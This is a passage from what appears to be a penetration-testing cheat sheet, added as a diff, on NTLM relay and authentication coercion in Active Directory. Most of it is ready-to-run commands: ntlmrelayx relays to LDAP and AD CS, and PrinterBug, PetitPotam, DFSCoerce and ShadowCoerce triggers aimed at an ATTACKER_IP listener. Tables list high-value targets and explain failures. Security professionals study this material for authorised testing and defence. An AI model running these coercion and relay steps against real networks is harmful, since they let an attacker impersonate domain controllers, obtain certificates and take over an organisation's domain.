+<div class="language-bash highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldaps://<span class="nv">$DC_IP</span><span class="w"> </span>--no-smb-server<span class="w"> </span>--delegate-access
+</span></code></pre></div>
+<p>HTTP to AD CS:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>http://ca01.corp.local/certsrv/certfnsh.asp<span class="w"> </span>--adcs<span class="w"> </span>--template<span class="w"> </span>Machine<span class="w"> </span>--no-smb-server
+</span></code></pre></div>
+<p>WebDAV UNC-style path examples:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>\\ATTACKER_IP@80\share
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>\\attacker-host@80\share
+</span></code></pre></div>
+<p>From a controlled Windows host:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>dir \\ATTACKER_IP@80\share
+</span></code></pre></div>
+<p>HTTP server considerations:</p>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Port 80</td>
+<td>Common WebDAV/HTTP listener port.</td>
+</tr>
+<tr>
+<td>Hostname</td>
+<td>Some auth behavior differs by hostname/IP.</td>
+</tr>
+<tr>
+<td>WebClient</td>
+<td>Needed for WebDAV-style UNC HTTP access.</td>
+</tr>
+<tr>
+<td>WebDAV coercion</td>
+<td>Some coercion techniques can trigger HTTP auth.</td>
+</tr>
+<tr>
+<td>LDAP/AD CS target</td>
+<td>Common relay target.</td>
+</tr>
+</tbody>
+</table>
+<p>Common outcomes:</p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HTTP auth received</td>
+<td>Victim connected to HTTP listener.</td>
+</tr>
+<tr>
+<td>Relay to LDAP succeeds</td>
+<td>LDAP action may be possible.</td>
+</tr>
+<tr>
+<td>Relay to AD CS succeeds</td>
+<td>Certificate may be issued.</td>
+</tr>
+<tr>
+<td>No auth received</td>
+<td>WebClient not running, trigger failed, or name/path issue.</td>
+</tr>
+<tr>
+<td>Falls back to SMB</td>
+<td>Path or service behavior did not use WebDAV.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="coercion-primitives">Coercion Primitives</h2>
+<p>Authentication coercion forces or triggers a remote Windows machine to authenticate to an attacker-controlled listener.</p>
+<p>Common target identity:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>MACHINE$ account
+</span></code></pre></div>
+<p>Example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>DC01$ authenticates to attacker
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>Attacker relays DC01$ to AD CS
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>Certificate is requested as DC01$
+</span></code></pre></div>
+<p>Common coercion protocols and interfaces:</p>
+<table>
+<thead>
+<tr>
+<th>Primitive</th>
+<th>Interface / idea</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PrinterBug</td>
+<td>MS-RPRN / Print Spooler.</td>
+</tr>
+<tr>
+<td>PetitPotam</td>
+<td>MS-EFSRPC.</td>
+</tr>
+<tr>
+<td>DFSCoerce</td>
+<td>MS-DFSNM.</td>
+</tr>
+<tr>
+<td>ShadowCoerce</td>
+<td>MS-FSRVP.</td>
+</tr>
+<tr>
+<td>WebDAV coercion</td>
+<td>HTTP/WebClient-based auth path.</td>
+</tr>
+<tr>
+<td>Coercer</td>
+<td>Multi-method coercion framework.</td>
+</tr>
+</tbody>
+</table>
+<p>General coercion flow:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>1. Start relay listener.
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>2. Trigger coercion from victim to attacker.
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>3. Victim authenticates to listener.
+</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a>4. ntlmrelayx relays authentication to target.
+</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a>5. Action is performed as victim identity.
+</span></code></pre></div>
+<p>Listener example:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>AD CS listener example:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>http://ca01.corp.local/certsrv/certfnsh.asp<span class="w"> </span>--adcs<span class="w"> </span>--template<span class="w"> </span>Machine<span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>Coercion usually needs:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Network reachability</td>
+<td>Victim must reach attacker listener.</td>
+</tr>
+<tr>
+<td>Target protocol exposed</td>
+<td>RPC/SMB/HTTP path depending on method.</td>
+</tr>
+<tr>
+<td>Valid credentials</td>
+<td>Many coercion methods require domain credentials.</td>
+</tr>
+<tr>
+<td>Service enabled</td>
+<td>Example: Print Spooler for PrinterBug.</td>
+</tr>
+<tr>
+<td>Relay target vulnerable</td>
+<td>Relay must succeed after authentication arrives.</td>
+</tr>
+</tbody>
+</table>
+<p>Authentication listener check:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tun0<span class="w"> </span>-A
+</span></code></pre></div>
+<p>This can confirm whether authentication is received, but do not run Responder on the same ports as ntlmrelayx during relay unless configured to avoid conflicts.</p>
+<p>Port conflicts:</p>
+<table>
+<thead>
+<tr>
+<th>Tool behavior</th>
+<th>Ports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SMB listener</td>
+<td><code>445</code></td>
+</tr>
+<tr>
+<td>HTTP listener</td>
+<td><code>80</code></td>
+</tr>
+<tr>
+<td>HTTPS listener</td>
+<td><code>443</code></td>
+</tr>
+<tr>
+<td>Responder SMB/HTTP</td>
+<td>Can conflict with ntlmrelayx.</td>
+</tr>
+</tbody>
+</table>
+<p>Common coercion result meanings:</p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Authentication arrives</td>
+<td>Coercion worked at least to listener.</td>
+</tr>
+<tr>
+<td>Relay succeeds</td>
+<td>Target accepted relayed auth.</td>
+</tr>
+<tr>
+<td>Relay fails due to signing</td>
+<td>Target protocol protection blocked action.</td>
+</tr>
+<tr>
+<td>Coercion fails</td>
+<td>Service disabled, patched, blocked, or wrong method.</td>
+</tr>
+<tr>
+<td>Access denied</td>
+<td>Credentials insufficient for coercion call or relay action.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="printerbug">PrinterBug</h2>
+<p>PrinterBug abuses the Print Spooler RPC interface to trigger authentication from a target machine.</p>
+<p>It is often associated with MS-RPRN.</p>
+<p>Common target:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>Computer account of the coerced machine
+</span></code></pre></div>
+<p>Example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>DC01$ -&gt; authenticates to attacker
+</span></code></pre></div>
+<p>Requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Print Spooler running</td>
+<td>Target must expose spooler behavior.</td>
+</tr>
+<tr>
+<td>Network reachability</td>
+<td>Target must reach attacker listener.</td>
+</tr>
+<tr>
+<td>Credentials</td>
+<td>Usually requires domain credentials.</td>
+</tr>
+<tr>
+<td>Relay listener</td>
+<td>ntlmrelayx or capture listener.</td>
+</tr>
+</tbody>
+</table>
+<p>Check spooler with rpcdump:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>rpcdump.py<span class="w"> </span>@<span class="nv">$TARGET</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>MS-RPRN
+</span></code></pre></div>
+<p>Check with NetExec module if available in environment:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-M<span class="w"> </span>spooler
+</span></code></pre></div>
+<p>Start relay listener:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>smb://<span class="nv">$TARGET_HOST</span><span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>For AD CS relay:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>http://ca01.corp.local/certsrv/certfnsh.asp<span class="w"> </span>--adcs<span class="w"> </span>--template<span class="w"> </span>Machine<span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>Trigger with printerbug-style tooling:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>printerbug.py<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">:</span><span class="nv">$PASS</span><span class="s2">@</span><span class="nv">$TARGET</span><span class="s2">&quot;</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span>
+</span></code></pre></div>
+<p>Alternative syntax used by some builds:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>python3<span class="w"> </span>printerbug.py<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">:</span><span class="nv">$PASS</span><span class="s2">@</span><span class="nv">$TARGET</span><span class="s2">&quot;</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span>
+</span></code></pre></div>
+<p>If using hash authentication:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>printerbug.py<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$TARGET</span><span class="s2">&quot;</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span>
+</span></code></pre></div>
+<p>Expected incoming identity:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>TARGETHOST$
+</span></code></pre></div>
+<p>Example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>DC01$
+</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>FILESERV01$
+</span></code></pre></div>
+<p>Good targets:</p>
+<table>
+<thead>
+<tr>
+<th>Target</th>
+<th>Why interesting</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Domain Controller</td>
+<td>Machine account can be high-value in AD CS relay.</td>
+</tr>
+<tr>
+<td>File server</td>
+<td>May have useful rights or sessions.</td>
+</tr>
+<tr>
+<td>Unconstrained delegation host</td>
+<td>Can combine with ticket capture paths.</td>
+</tr>
+<tr>
+<td>CA server</td>
+<td>Certificate services context.</td>
+</tr>
+</tbody>
+</table>
+<p>Common failures:</p>
+<table>
+<thead>
+<tr>
+<th>Error</th>
+<th>Possible meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>No auth received</td>
+<td>Spooler disabled, blocked, or wrong listener.</td>
+</tr>
+<tr>
+<td>Access denied</td>
+<td>Credentials cannot call required interface.</td>
+</tr>
+<tr>
+<td>Relay fails</td>
+<td>Relay target protections or rights issue.</td>
+</tr>
+<tr>
+<td>Hostname issue</td>
+<td>Try FQDN, short name, or IP depending on context.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="petitpotam">PetitPotam</h2>
+<p>PetitPotam abuses MS-EFSRPC behavior to coerce authentication from a target to an attacker-controlled listener.</p>
+<p>It is commonly associated with coercing machine account authentication and relaying it to AD CS or LDAP in lab environments.</p>
+<p>Requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Reachable EFSRPC interface</td>
+<td>Target must expose usable RPC path.</td>
+</tr>
+<tr>
+<td>Network reachability</td>
+<td>Target must reach attacker.</td>
+</tr>
+<tr>
+<td>Credentials</td>
+<td>Some modes require credentials depending on environment.</td>
+</tr>
+<tr>
+<td>Relay target</td>
+<td>LDAP/AD CS/SMB depending on objective.</td>
+</tr>
+</tbody>
+</table>
+<p>Start AD CS relay listener:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>http://ca01.corp.local/certsrv/certfnsh.asp<span class="w"> </span>--adcs<span class="w"> </span>--template<span class="w"> </span>Machine<span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>Start LDAP relay listener:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>--smb2support<span class="w"> </span>--delegate-access
+</span></code></pre></div>
+<p>Trigger PetitPotam:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>python3<span class="w"> </span>PetitPotam.py<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span><span class="w"> </span><span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>Against DC:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>python3<span class="w"> </span>PetitPotam.py<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span><span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>With hash if supported by the local tool version:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>python3<span class="w"> </span>PetitPotam.py<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span><span class="w"> </span><span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>Unauthenticated mode may work in some old or intentionally vulnerable lab setups:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>python3<span class="w"> </span>PetitPotam.py<span class="w"> </span><span class="nv">$ATTACKER_IP</span><span class="w"> </span><span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>Expected incoming identity:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>TARGETHOST$
+</span></code></pre></div>
+<p>Common PetitPotam targets:</p>
+<table>
+<thead>
+<tr>
+<th>Target</th>
+<th>Why interesting</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Domain Controller</td>
+<td>AD CS relay may produce DC certificate if conditions allow.</td>
+</tr>
+<tr>
+<td>File server</td>
+<td>Machine account relay target.</td>
+</tr>
+<tr>
+<td>CA server</td>
+<td>Certificate service environment context.</td>
+</tr>
+<tr>
+<td>Any domain server</td>
+<td>Machine authentication source.</td>
+</tr>
+</tbody>
+</table>
+<p>Common failures:</p>
+<table>
+<thead>
+<tr>
+<th>Error</th>
+<th>Possible meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>STATUS_ACCESS_DENIED</code></td>
+<td>Method requires auth or blocked.</td>
+</tr>
+<tr>
+<td>No auth received</td>
+<td>Target not vulnerable/reachable or wrong method.</td>
+</tr>
+<tr>
+<td>Relay fails</td>
+<td>AD CS/LDAP target protection or template issue.</td>
+</tr>
+<tr>
+<td>RPC error</td>
+<td>Interface unavailable or patched behavior.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="dfscoerce">DFSCoerce</h2>
+<p>DFSCoerce abuses Distributed File System Namespace Management RPC behavior to coerce authentication.</p>
+<p>It is associated with MS-DFSNM.</p>
+<p>Requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DFS Namespace Management interface</td>
+<td>Target exposes required RPC interface.</td>
+</tr>
+<tr>
+<td>Credentials</td>
+<td>Usually domain credentials.</td>
+</tr>
+<tr>
+<td>Listener</td>
+<td>ntlmrelayx or capture listener.</td>
+</tr>
+<tr>
+<td>Relay target</td>
+<td>SMB/LDAP/AD CS depending on objective.</td>
+</tr>
+</tbody>
+</table>
+<p>Start listener:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>--smb2support<span class="w"> </span>--delegate-access
+</span></code></pre></div>
+<p>AD CS listener:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>http://ca01.corp.local/certsrv/certfnsh.asp<span class="w"> </span>--adcs<span class="w"> </span>--template<span class="w"> </span>Machine<span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>Trigger DFSCoerce:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>python3<span class="w"> </span>dfscoerce.py<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span>
+</span></code></pre></div>
+<p>Alternative syntax used by some repositories:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>python3<span class="w"> </span>dfscoerce.py<span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span>
+</span></code></pre></div>
+<p>With NTLM hash if supported by the build:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>python3<span class="w"> </span>dfscoerce.py<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span>
+</span></code></pre></div>
+<p>Expected incoming identity:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>TARGETHOST$
+</span></code></pre></div>
+<p>Useful test listener:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tun0<span class="w"> </span>-A
+</span></code></pre></div>
+<p>Do not run Responder on SMB/HTTP ports at the same time as ntlmrelayx unless intentionally configured.</p>
+<p>Common failures:</p>
+<table>
+<thead>
+<tr>
+<th>Error</th>
+<th>Possible meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Access denied</td>
+<td>Credentials or RPC restrictions.</td>
+</tr>
+<tr>
+<td>No auth received</td>
+<td>Method not working against target.</td>
+</tr>
+<tr>
+<td>RPC unavailable</td>
+<td>DFSNM interface unavailable.</td>
+</tr>
+<tr>
+<td>Relay failed</td>
+<td>Relay target protection issue.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="shadowcoerce">ShadowCoerce</h2>
+<p>ShadowCoerce abuses File Server Remote VSS Protocol behavior to coerce authentication.</p>
+<p>It is associated with MS-FSRVP.</p>
+<p>Requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>FSRVP interface</td>
+<td>Target exposes required RPC interface.</td>
+</tr>
+<tr>
+<td>Credentials</td>
+<td>Usually domain credentials.</td>
+</tr>
+<tr>
+<td>Listener</td>
+<td>ntlmrelayx or capture listener.</td>
+</tr>
+<tr>
+<td>Relay target</td>
+<td>SMB/LDAP/AD CS depending on objective.</td>
+</tr>
+</tbody>
+</table>
+<p>Start relay listener:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>--smb2support<span class="w"> </span>--delegate-access
+</span></code></pre></div>
+<p>AD CS listener:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>http://ca01.corp.local/certsrv/certfnsh.asp<span class="w"> </span>--adcs<span class="w"> </span>--template<span class="w"> </span>Machine<span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>Trigger ShadowCoerce:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>python3<span class="w"> </span>shadowcoerce.py<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span>
+</span></code></pre></div>
+<p>Alternative syntax:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>python3<span class="w"> </span>shadowcoerce.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span>
+</span></code></pre></div>
+<p>With NTLM hash if supported by the build:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>python3<span class="w"> </span>shadowcoerce.py<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span>
+</span></code></pre></div>
+<p>Expected incoming identity:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>TARGETHOST$
+</span></code></pre></div>
+<p>Common target types:</p>
+<table>
+<thead>
+<tr>
+<th>Target</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>File servers</td>
+<td>More likely to expose file-service-related interfaces.</td>
+</tr>
+<tr>
+<td>Backup servers</td>
+<td>May expose VSS-related functionality.</td>
+</tr>
+<tr>
+<td>Windows servers</td>
+<td>Worth testing in labs if in scope.</td>
+</tr>
+<tr>
+<td>DCs</td>
+<td>High-value if coercion and relay path work.</td>
+</tr>
+</tbody>
+</table>
+<p>Common failures:</p>
+<table>
+<thead>
+<tr>
+<th>Error</th>
+<th>Possible meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>RPC error</td>
+<td>Interface unavailable.</td>
+</tr>
+<tr>
+<td>Access denied</td>
+<td>Credentials or service restrictions.</td>
+</tr>
+<tr>
+<td>No auth received</td>
+<td>Coercion failed.</td>
+</tr>
+<tr>
+<td>Relay failed</td>
+<td>Target service protections or rights issue.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="coercer">Coercer</h2>
+<p>Coercer is a tool that automatically tests multiple authentication coercion methods.</p>
+<p>It can scan a target for coercion vectors and trigger authentication to an attacker-controlled listener.</p>
+<p>The project describes itself as a Python script to coerce a Windows server to authenticate to an arbitrary machine through multiple methods.</p>
+<p>Common use:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>Find which coercion methods work against a target
+</span><span id="__span-91-2"><a id="__codelineno-91-2" name="__codelineno-91-2" href="#__codelineno-91-2"></a>Trigger authentication while ntlmrelayx is listening
+</span><span id="__span-91-3"><a id="__codelineno-91-3" name="__codelineno-91-3" href="#__codelineno-91-3"></a>Document working primitives
+</span></code></pre></div>
+<p>Basic scan:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>coercer<span class="w"> </span>scan<span class="w"> </span>-t<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Specify listener:</p>
